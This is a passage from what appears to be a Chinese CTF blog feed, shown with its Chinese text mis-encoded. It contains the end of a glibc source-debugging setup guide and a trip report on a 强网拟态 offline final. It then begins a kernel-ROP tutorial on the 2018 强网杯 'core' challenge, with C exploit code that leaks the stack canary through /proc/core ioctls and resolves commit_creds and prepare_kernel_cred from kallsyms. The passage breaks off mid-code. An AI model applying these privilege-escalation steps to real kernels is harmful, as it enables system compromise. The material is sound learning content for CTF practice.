title="æ‰¾ä¸€ä¸‹å‡½æ•°æ‰€åœ¨çš„æºæ–‡ä»¶"></a>æ‰¾ä¸€ä¸‹å‡½æ•°æ‰€åœ¨çš„æºæ–‡ä»¶</h2><p>æ¯”å¦‚æˆ‘ç°åœ¨æƒ³è¿›è¡Œexitæºç è°ƒè¯•ï¼Œå…ˆå»ä¸‹é¢è¿™ä¸ªç½‘ç«™æœä¸€ä¸‹exitæºç åœ¨å“ªä¸ªæ–‡ä»¶é‡Œé¢ã€‚</p><p><a href="https://code.woboq.org/">åœ¨çº¿æŸ¥çœ‹æºç ç½‘ç«™</a></p><p><img src="/../img/2706180-20220415172618725-1985569220.png"></p><p>è¿›å»ä¹‹åï¼Œæœç´¢æƒ³æ‰¾çš„å‡½æ•°ï¼Œç„¶åå°±å¯ä»¥çœ‹åˆ°å®ƒæ‰€åœ¨çš„æ–‡ä»¶ã€‚å‘ç°exit.cåœ¨stdlibæ–‡ä»¶ä¸­ã€‚</p><p><img src="/../img/2706180-20220415172034631-573661594.png" alt="image-20220415165453694"></p><p>æˆ‘ä»¬å»çœ‹ä¸€ä¸‹ï¼Œæœç„¶æ˜¯åœ¨stdlibä¸­å‘ç°äº†exit.c</p><p><img src="/../img/2706180-20220415172716344-725839155.png"></p><h2 id="é…ç½®-gdbinit"><a href="#é…ç½®-gdbinit" class="headerlink" title="é…ç½®.gdbinit"></a>é…ç½®.gdbinit</h2><p>ç„¶åpwdï¼Œå¤åˆ¶ä¸€ä¸‹è·¯å¾„ã€‚</p><p><img src="/../img/2706180-20220415172034380-1120493636.png" alt="image-20220415165737197"></p><p>ç„¶åå»ç”¨æˆ·ç›®å½•ä¸‹è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .gdbinit</span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span>  åˆšæ‰å¤åˆ¶çš„è·¯å¾„</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/../img/2706180-20220415172033716-637621406.png" alt="image-20220415170846971"></p><p>æœ€åä¿å­˜ä¸€ä¸‹å°±okäº†ã€‚</p><p>ç„¶ågdbç»§ç»­è°ƒè¯•elfç¨‹åºå³å¯ï¼Œç­‰è¿›å…¥ä½ è£…è½½è¿›å»çš„æ–‡ä»¶ä¹‹åï¼Œå°±ä¼šè‡ªåŠ¨å±•ç¤ºglibcæºä»£ç ã€‚</p><h2 id="æœ€åæ•ˆæœ"><a href="#æœ€åæ•ˆæœ" class="headerlink" title="æœ€åæ•ˆæœ"></a>æœ€åæ•ˆæœ</h2><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220415172032901-1046593594.png" alt="image-20220415171511841"></p><p>PSï¼šå¦‚æœè°ƒè¯•å…¶ä»–å‡½æ•°æ²¡æœ‰å‡ºç°æºç ï¼Œå°±è¯´æ˜æ²¡æœ‰å¯¼å…¥æˆåŠŸå¯¹åº”çš„ä»£ç æºæ–‡ä»¶ï¼Œå¦å¤–å°±æ˜¯è°ƒè¯•ä¸åŒçš„ç¨‹åºï¼Œå¯¹åº”çš„glibcç‰ˆæœ¬ä¸è¦é€‰é”™äº†ã€‚</p><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="http://taqini.space/2020/11/01/glibc-debug-pwndbg/#Glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Glibcæºç è°ƒè¯•ç¯å¢ƒæ­å»º | TaQini</a></p>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ‹Ÿæ€çº¿ä¸‹æ¸¸è®°</title>
      <link href="/posts/b0250b87.html"/>
      <url>/posts/b0250b87.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¯ç¨‹ï¼š"><a href="#å¯ç¨‹ï¼š" class="headerlink" title="å¯ç¨‹ï¼š"></a>å¯ç¨‹ï¼š</h3><p>åœ¨å¼ºç½‘æ‹Ÿæ€çº¿ä¸Šèµ›æ‹¿åˆ°äº†è¿›å…¥å†³èµ›çš„èµ„æ ¼ï¼Œå› ä¸ºç–«æƒ…åŸå› å¤§å®¶éƒ½ä»¥ä¸ºå†³èµ›ä¼šåœ¨çº¿ä¸Šï¼Œè€Œèµ·åˆä¹Ÿç¡®å®å¦‚æ­¤ï¼Œèµ›æ–¹è¯´æ˜¯å†³èµ›ä¹Ÿè¿›è¡Œçº¿ä¸Šèµ›ï¼Œä¸è¿‡éšç€å›½å®¶å¯¹äºé˜²ç–«æ”¿ç­–çš„æ”¾å¼€ï¼Œåœ¨ä¸´è¿‘å†³èµ›çš„æ—¶å€™èµ›æ–¹æœ€ç»ˆå†³å®šå¯ä»¥å‡ºåæ”¯é˜Ÿä¼æ¥å—äº¬å‚åŠ çº¿ä¸‹èµ›ï¼Œè€Œå…¶ä»–äº”åæ”¯é˜Ÿä¼åœ¨çº¿ä¸Šè¿›è¡Œã€‚</p><p>èœé¸¡çš„æˆ‘è‡ªç„¶æ˜¯æ¸´æœ›çº¿ä¸‹èµ›çš„ï¼Œå¹¶ä¸”åœ¨å®¶é‡Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆäº‹æƒ…(é™¤äº†å­¦è½¦å’Œè€ƒè¯•â€¦),æœ€ç»ˆå†³å®šå‰å¾€å—äº¬å‚åŠ çº¿ä¸‹èµ›å¹¶ä¸”ä¸å¹³å¸¸äº¤æµç”šå¤šçš„å¸ˆå‚…ä»¬è§é¢ã€‚äºæ˜¯ä¹°ç¥¨ï¼Œå‡ºå‘ï¼Œå‰å¾€å—äº¬ï¼</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212191125243.png" alt="image-20221219112522111"></p><p>è¯¥è¯´ä¸è¯´ï¼Œå› ä¸ºè·¯è´¹æŠ¥é”€é™é¢æ˜¯1500ï¼Œåé«˜é“ä¸€ç­‰åº§æ˜¯çœŸçš„é¦™ï¼Œç„¶åå¤–å‡ºä¹Ÿä¸ç”¨è€ƒè™‘æ˜¯åœ°é“å€’å…¬äº¤å•¥çš„ï¼Œç›´æ¥å‡ºç§Ÿè½¦å°±æ˜¯å†²ã€‚</p><h3 id="è§é¢ï¼š"><a href="#è§é¢ï¼š" class="headerlink" title="è§é¢ï¼š"></a>è§é¢ï¼š</h3><p>å»åˆ°é…’åº—è§åˆ°äº†å¹³å¸¸çº¿ä¸Šç»å¸¸äº¤æµçš„å¸ˆå‚…ä»¬(h1J4ckerå¸ˆå‚… winmtå¸ˆå‚…è¿˜æœ‰ä¸‰å“ˆå¸ˆå‚…ç­‰ç­‰)ã€‚winmtå¸ˆå‚…å®åœ¨æ˜¯å¤ªé«˜è¾£ï¼Œä¸€ç±³ä¹å¤š~   </p><p>é…’åº—ç¡®å®å¤§ï¼Œå¤´ä¸¤æ¬¡åªèƒ½é ç€ç®­å¤´æ ‡å¿—æ‰¾åˆ°æˆ¿é—´ï¼Œé…’åº—æˆ¿é—´ä¹ŸæŒºä¸é”™çš„</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221116485.jpg" alt="img"></p><p>é™†é™†ç»­ç»­äººé½äº†ä¹‹åå…ˆå»åŒ»é™¢æ’äº†ä¸€ä¸ªåŠå°æ—¶çš„é˜Ÿä¼åšäº†æ ¸é…¸ï¼Œå®Œäº‹ä¹‹åå»èšé¤åƒäº†ç«é”…</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221112652.jpg" alt="img"></p><h3 id="æ¯”èµ›ï¼š"><a href="#æ¯”èµ›ï¼š" class="headerlink" title="æ¯”èµ›ï¼š"></a>æ¯”èµ›ï¼š</h3><p>ç¬¬äºŒå¤©èµ·æ¥å…ˆå»å¹²äº†æ—©é¥­ï¼Œè¯´å®è¯è¿™ä¸ªè‡ªåŠ©çš„æ—©é¤ç¡®å®ç‰›çš®ï¼Œåƒäº†äº”å¤©ä¸é‡æ ·çš„æ—©é¤(é¦„é¥¨ï¼Œæ±¤é¢ï¼ŒçŒæ±¤åŒ…ï¼Œè”¬èœæ²™æ‹‰ï¼Œå°ç¬¼åŒ…ï¼Œå¹²ç…¸è±†è§’ç­‰ç­‰å¤ªå¤šäº†è®°ä¸æ¸…)</p><p>æ¥ç€åšäº†ç¬¬äºŒç­è½¦å»äº†æ¯”èµ›ä¼šåœº</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221121829.jpg" alt="img" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221122695.jpg" alt="img" style="zoom:50%;" /><p>ä¸Šåˆå‡†å¤‡äº†ä¸‹ç¯å¢ƒï¼Œç„¶åæ˜¯å¼€å¹•å¼å¥½å¤šé¢†å¯¼ä¸Šå»è®²è¯ æ¯”èµ›æ˜¯åäºŒç‚¹å¼€å§‹ï¼Œä¸ºäº†å°½é‡ä¸å½±å“æ¯”èµ›è‚¯å®šæ˜¯åˆé¤åœ¨åäºŒç‚¹å‰æä¾›ï¼Œåˆæ˜¯å¹²é¥­â€¦</p><p>æ¯”èµ›æ­£å¼å¼€å§‹ä¹‹åï¼Œæˆ‘è®°å¾—æ˜¯æœ‰ä¸‰ä¸ªèµ›é“ï¼Œä¸€ä¸ªèµ›é“æ”¾çš„æ˜¯CTFé¢˜ç›®ï¼ŒPWNæœ‰å››é“é¢˜ï¼Œæˆ‘å’Œh1å¸ˆå‚…ä¸€äººåšäº†ä¸€é“ï¼Œæˆ‘æ‰“çš„æ˜¯ä¸€ä¸ªçŒœæµ‹éšæœºæ•°+SSP Leakï¼Œh1å¸ˆå‚…åšçš„é‚£ä¸ªæ˜¯å †é¢˜ï¼Œæ•´ä½“ä¸ç®—éš¾ï¼Œä½†æ˜¯ç”¨idaæ‰“å¼€ä¹‹åçš„æ•°æ®æ˜¯æ··ä¹±çš„(è¿™é‡Œä¸çŸ¥é“æ˜¯æ€ä¹ˆå®ç°çš„)ï¼Œåæ­£ä¸»è¦æ˜¯é äº¤äº’æ¥å®Œæˆçš„å¤§ä½“è„šæœ¬ï¼Œæœ€åçš„ä¸€äº›ç»†èŠ‚æ˜¯è¯»äº†ä¸‹æ±‡ç¼–è°ƒäº†ä¸€ä¸‹æå®šçš„ã€‚å¦å¤–ä¸¤é“pwnï¼Œä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ æ ˆæº¢å‡ºï¼Œæ­£å¸¸æ¥è¯´è¿™ä¸ªé¢˜è‚¯å®šæ˜¯è¦è¢«æ‰“çƒ‚çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ä¸Šäº†æ‹Ÿæ€é˜²å¾¡ï¼Œå°±æ˜¯æˆ‘çš„ä¸€ä¸ªpayloadæ‰“è¿‡å»ï¼ŒæœåŠ¡ç«¯é‚£é‡ŒæŒ‚èµ·çš„å¥½å‡ ä¸ªç¨‹åºçš„å›æ˜¾ä¸€æ ·æ‰å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œå› æ­¤æ ¼å¼åŒ–å­—ç¬¦ä¸²å’Œæ ˆæº¢å‡ºå…¶å®å…¨éƒ½ç”¨ä¸äº†ï¼Œä¸€é“çœŸæ­£æ„ä¹‰ä¸Šçš„æ— è§£PWN(æ²¡é”™ï¼Œè¿™é¢˜æ”¾å‡ºæ¥å°±ä¸æ˜¯è®©å¾—åˆ†çš„ï¼Œè€Œæ˜¯ä¸ºäº†è¯å®è¿™ä¸ªæ‹Ÿæ€é˜²å¾¡çš„å¼ºå¤§â€¦)ï¼Œå¦å¤–ä¸€é“åœ¨å¾—çŸ¥äº†ä¹Ÿæ˜¯æ— è§£ä¹‹åå°±æ²¡å†çœ‹äº†ã€‚</p><p>ç„¶åpwnåšå®Œä¹‹åï¼Œå°±æ²¡äº‹å¹²äº†ã€‚å› ä¸ºè¿™ä¸ªæ¯”èµ›è€ƒçš„ä¸»è¦æ˜¯å¯¹è®¾å¤‡çš„çœŸå®æ”»å‡»å’Œæ‹Ÿæ€é˜²å¾¡è€Œå¹¶éæ˜¯CTFï¼Œæ‰€ä»¥CTFé¢˜ç›®åªæ˜¯ä¸ºäº†è§£å‡ºæ¥å¾—åˆ†ï¼Œç„¶åå»åšå…¶ä»–èµ›é“çš„é¢˜ç›®ï¼Œæ”»å‡»çœŸå®è®¾å¤‡ã€‚</p><p>åé¢çš„å‡ å¤©PWNæ‰‹å°±åšå¤§ç‰¢äº†ï¼Œé™¤äº†ä¸€ä¸ªADASå’ŒT-BOX4è¿™ä¿©æ‹¿åˆ°äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå‰©ä¸‹çš„é¢˜ç›®åŸºæœ¬éƒ½æ²¡æœ‰PWNæ‰‹çš„äº‹æƒ…äº†ï¼Œé‚£ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶éƒ½æ˜¯è·Ÿç€winmtå¸ˆå‚…åˆ†æå­¦ä¹ äº†ä¸€ä¸‹ï¼Œéƒ½æ˜¯aarch64çš„ç¨‹åºæˆ‘è®°å¾—ã€‚ç›®çš„æ˜¯æ‰¾æ¼æ´å†™æŠ¥å‘Šï¼Œå¹¶ä¸æ˜¯æ‹¿shell(å› ä¸ºç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿä¸å®Œæ•´)</p><p>winmtå¸ˆå‚…ç»™æˆ‘è¯´çš„æ€è·¯æ˜¯å¯ä»¥ä»å±é™©å‡½æ•°ä¸‹æ‰‹ï¼Œçœ‹äº¤å‰å¼•ç”¨ç„¶åå¦‚æœå±é™©å‡½æ•°çš„å‚æ•°å¯æ§ï¼Œé‚£å°±å±äºä¸€äº›æ¼æ´ï¼Œæ¯”å¦‚execçš„å‚æ•°å¯æ§å°±æ˜¯ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œæˆ–è€…fopenå‡½æ•°çš„å‚æ•°å¯æ§å°±æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ç­‰ç­‰(å½“ç„¶å®é™…è¦æ¯”è¿™å¤æ‚ï¼Œä¸»è¦æ˜¯éœ€è¦é€†å‘å’Œä»”ç»†åˆ†æ)ï¼Œå½“æ—¶æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªæ ˆä¸Šçš„off by nullæ¼æ´ï¼Œä»¥åŠä¸€ä¸ªå †æº¢å‡ºçš„æ¼æ´å’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‰©ä¸‹åŸºæœ¬ä¸Šéƒ½æ˜¯webå¤§å“¥ä»¬åœ¨ç–¯ç‹‚ä¸Šåˆ†ã€‚</p><p>é™¤å»æ¯”èµ›ä¹‹å¤–ï¼Œè®©æˆ‘å°è±¡æ¯”è¾ƒæ·±çš„å°±æ˜¯åƒçš„éå¸¸niceï¼Œè¿™äº›å¤©åƒäº†ç«é”… çƒ¤è‚‰ æŠ«è¨ çƒ¤é¸­ é²é±¼ é‡‘æ±¤è‚¥ç‰› ç…²ä»”é¥­ç­‰ç­‰ï¼Œä»–ä»¬ç†¬å¤œå¹²åˆ°å¾ˆæ™šçš„å¸ˆå‚…è¿˜åƒäº†KFC(å¥½åƒå½“æ—¶å°±æˆ‘ç¡äº† 0.0)ï¼Œç„¶åæ™šä¸Šè¿˜å’Œh1å¸ˆå‚…çœ‹äº†ä¸¤åœºä¸–ç•Œæ¯(è™½ç„¶åœ¨çœ‹å†³èµ›çš„æ—¶å€™ä»–å‡ ä¹ä¸€ç›´åœ¨ç¡è§‰QAQ)</p><h3 id="å°¾å£°ï¼š"><a href="#å°¾å£°ï¼š" class="headerlink" title="å°¾å£°ï¼š"></a>å°¾å£°ï¼š</h3><p>æœ€åæ¯”èµ›çš„æˆç»©è¿˜å¯ä»¥å§ï¼Œä¸»è¦æ˜¯ç¬¬ä¸€æ¬¡æ‰“è¿™ä¸ªæ²¡ç»éªŒï¼Œå…¶å®åº”è¯¥å…ˆå»æ‰“é‚£äº›è®¾å¤‡äº¤å®éªŒæŠ¥å‘Šå¾—åˆ†ï¼Œè€Œä¸æ˜¯å…ˆé€®ç€CTFçš„é¢˜ç›®æ—¥ï¼Œè¿™å°±å¯¼è‡´äº†ä¸€äº›é˜Ÿä¼æŠŠå¾ˆç®€å•çš„æ¼æ´æ‰¾åˆ°å¹¶ä¸”æäº¤æŠ¥å‘Šåï¼Œé‚£äº›è®¾å¤‡å°±ä¸‹çº¿äº†ï¼Œé”™å¤±äº†æœ€å¼€å§‹çš„å¾—åˆ†æœºä¼šã€‚</p><p>ä¸è¿‡è¿™æ¬¡æ¯”èµ›æ”¶è·è¿˜æ˜¯è›®å¤§çš„(è™½ç„¶å¾ˆå¤šæ—¶å€™åœ¨æ‘¸é±¼)ï¼Œä½†æ˜¯èƒ½å’Œå¸ˆå‚…ä»¬ä¸€èµ·çº¿ä¸‹äº¤æµå…¶å®è¿˜æŒºä¸é”™çš„ï¼Œå°¤å…¶æ˜¯winmtå¸ˆå‚…çš„ç°åœºæ•™å­¦QAQã€‚</p><p>æœ€åæ¥äº†ä¸€å¼ ä¸‰ä¸ªPWNæ‰‹çš„åˆå½± -&gt;_-&gt;</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300998.jpg" alt="img" style="zoom:50%;" /><p>ä»¥åŠæ‰€æœ‰äººçš„åˆç…§</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221300400.jpg" alt="img" style="zoom:50%;" /><p>å½“ç„¶äº†  æœ€ç‰›çš®çš„å±…ç„¶æ˜¯å‘ç°è‡ªå·±ä¸Šç”µè§†äº†</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212221301622.jpg" alt="img" style="zoom:50%;" /><p>åæ¶ˆæ¯æ˜¯æˆ‘ä»¬å…¨å†›è¦†æ²¡ï¼Œç›´æ¥éƒ½æˆå°é˜³äººâ€¦   </p><p>ä¹‹åè¿˜å¾—å†æå‡è‡ªå·±çš„æŠ€æœ¯ï¼Œå¸Œæœ›æœ‰æ›´å¤šæœºä¼šå’Œå¸ˆå‚…ä»¬ä¸€èµ·å‚åŠ çº¿ä¸‹èµ›</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº kernel-ROP &amp; ret2user &amp; bypass-SMEP çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/a31a5755.html"/>
      <url>/posts/a31a5755.html</url>
      
        <content type="html"><![CDATA[<p>å†…æ ¸æ€çš„ <code>ROP</code> å’Œç”¨æˆ·æ€çš„æ€è·¯å’Œåšæ³•æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨ <code>gadget</code> æ¥ä¸æ–­æ§åˆ¶æ‰§è¡Œæµï¼Œè¿›è¡Œä»»æ„çš„å‡½æ•°è°ƒç”¨ã€‚ä¸è¿‡è·å–åŸºåœ°å€è¿˜æœ‰æœç´¢ <code>gadget</code> ç­‰ä¸€äº›å°ç»†èŠ‚å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ€æƒ³ä¸å˜ï¼Œæ‰€ä»¥ç†è§£èµ·æ¥åº”è¯¥è¿˜æ˜¯å¾ˆå¿«çš„</p><h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel-ROP"></a>kernel-ROP</h2><p>ä¾‹é¢˜æ˜¯ <a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018å¼ºç½‘æ¯ pwn-core</a></p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>å‘ç° <code>ioctl</code> å‡½æ•°ä¸­å¯ä»¥æ§åˆ¶ <code>off</code> è¿™ä¸ªå…¨å±€å˜é‡ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" /><p><code>core_read</code> å‡½æ•°ï¼Œå­˜åœ¨æ•°ç»„ç´¢å¼•æº¢å‡ºçš„æ¼æ´ï¼Œ <code>off</code> æˆ‘ä»¬å¯æ§ï¼Œä¸”ç¨‹åºæ²¡æœ‰åšä»»ä½•æ£€æŸ¥ï¼Œ<code>v5</code> æ˜¯åœ¨æ ˆä¸­ï¼Œå› æ­¤é…åˆ <code>copy_to_user</code> å‡½æ•°å¯ä»¥æ³„éœ²æ ˆä¸­çš„ä»»æ„æ•°æ®ï¼Œè¿™é‡Œè€ƒè™‘æ¥æ³„éœ² <code>canary</code> ä»¥ä¾¿åé¢çš„ <code>rop</code> æ‰§è¡Œã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" /><p>é€šè¿‡åˆ†æ <code>off</code> ä¸º <code>0x40</code> çš„æ—¶å€™<code>&amp;v5[off]</code> æ­£å¥½æŒ‡å‘äº† <code>canary</code> çš„ä½ç½®ï¼ˆè¿™é‡Œå°±æ˜¯ <code>PWN</code> æ‰‹çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰€ä»¥ä¸å†èµ˜è¿°ï¼‰ï¼Œ<code>copy_to_user</code> ä¼šå°†å†…æ ¸ä¸­çš„æ•°æ® <code>copy</code> åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œä¹Ÿå°±æ˜¯èµ‹å€¼ç»™äº† <code>a1</code> ã€‚</p><p><code>core_copy_func</code> å‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªå¼ºè½¬çš„æ¼æ´ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå°† <code>__int64</code> ç±»å‹çš„ <code>a1</code> ï¼Œå¼ºè½¬ä¸ºäº† <code>unsigned __int16</code> ç±»å‹ï¼Œå¦‚æœæˆ‘ä»¬å°† <code>a1</code> è®¾ç½®ä¸º <code>0xffffffffffff0000 | (0xd0)</code> ï¼Œå°±å¯ä»¥åœ¨ç»•è¿‡ <code>if(a1 &gt; 63)</code> æ£€æŸ¥çš„æƒ…å†µä¸‹æ‰§è¡Œ <code>qmemcpy</code> å‡½æ•°å®Œæˆæ ˆæº¢å‡º</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" /><p>ä¸è¿‡ä¸Šé¢è¿™é‡Œåªæ˜¯èƒ½æ§åˆ¶ <code>a1</code> è¿™ä¸ªå­—èŠ‚æ•°ï¼Œæƒ³è¦ <code>ROP</code> è¿˜éœ€è¦æ§åˆ¶ <code>name</code> æ•°ç»„ä¸­çš„æ•°æ®ã€‚</p><p>é€šè¿‡æŸ¥çœ‹ <code>core_write</code> å‡½æ•°ï¼Œå‘ç°è¿™é‡Œå¯ä»¥ç›´æ¥æ§åˆ¶ <code>name</code> æ•°ç»„ä¸­çš„å†…å®¹ï¼Œå¦‚æ­¤ä»»æ„è¯»å’Œä»»æ„å†™éƒ½æœ‰äº†ï¼Œå°±å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„ <code>kernel-ROP</code> </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p><h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p><p>å› ä¸ºç¨‹åºå¼€äº† <code>canary</code> ï¼Œæ‰€ä»¥ <code>ROP</code> ä¹‹å‰éœ€è¦å…ˆè¿›è¡Œæ³„éœ² <code>canary</code></p><h4 id="æ³„éœ²-canary"><a href="#æ³„éœ²-canary" class="headerlink" title="æ³„éœ² canary"></a>æ³„éœ² <code>canary</code></h4><p>æ‰€ä»¥æ³„éœ² <code>canary</code> çš„éƒ¨åˆ† <code>exp</code> å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œä»å†…æ ¸ <code>copy</code> è¿‡æ¥çš„æ•°æ®æœ‰ <code>64</code> ä¸ªå­—èŠ‚ï¼Œè€Œä¸æ˜¯åªæœ‰ <code>canary</code> ï¼Œå½“æ—¶ç¨‹åºå°±å®šä¹‰äº†ä¸€ä¸ª <code>int</code> ç±»å‹çš„å˜é‡  <code>canary</code> ä¼ å…¥äº†åœ°å€è¿›è¡Œæ¥æ”¶ï¼Œç»“æœç›´æ¥æŠ¥é”™ï¼ˆåŸå› æ˜¯ç ´åäº†ç”¨æˆ·ç¨‹åºçš„ <code>canary</code>ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p><h4 id="è·å–å‡½æ•°çš„çœŸå®åœ°å€"><a href="#è·å–å‡½æ•°çš„çœŸå®åœ°å€" class="headerlink" title="è·å–å‡½æ•°çš„çœŸå®åœ°å€"></a>è·å–å‡½æ•°çš„çœŸå®åœ°å€</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">     